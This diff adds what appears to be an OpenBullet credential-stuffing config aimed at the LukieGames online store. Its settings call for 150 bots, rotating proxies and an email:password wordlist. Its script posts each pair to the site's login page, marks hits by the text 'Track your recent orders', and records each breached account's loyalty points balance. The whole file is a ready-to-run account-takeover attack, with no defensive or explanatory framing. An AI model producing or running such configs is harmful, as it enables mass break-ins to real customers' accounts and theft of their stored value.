@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "LukieGames",
+  "SuggestedBots": 150,
+  "LastModified": "2018-06-29T15:24:07.3629322+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://www.lukiegames.com/login.asp?ordertracking=1" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>&catalogid=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=TRUE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Your email or password are incorrect" 
+  KEYCHAIN Success OR 
+    KEY "Track your recent orders" 
+PARSE "<SOURCE>" LR "points left\">Total Lukie Points: " "<" Recursive=FALSE -> CAP "Points" "" "" 
